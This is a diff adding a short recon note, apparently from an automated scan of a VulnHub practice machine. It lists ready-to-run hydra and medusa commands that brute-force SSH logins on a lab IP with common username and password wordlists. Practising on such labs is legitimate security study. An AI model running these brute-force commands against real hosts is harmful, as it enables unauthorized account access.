@@ -1,0 +1,9 @@
+[*] ssh on tcp/22
+
+	[-] Bruteforce logins:
+
+		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/tcp_22_ssh_hydra.txt" ssh://192.168.92.151
+
+		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/tcp_22_ssh_medusa.txt" -M ssh -h 192.168.92.151
+
+
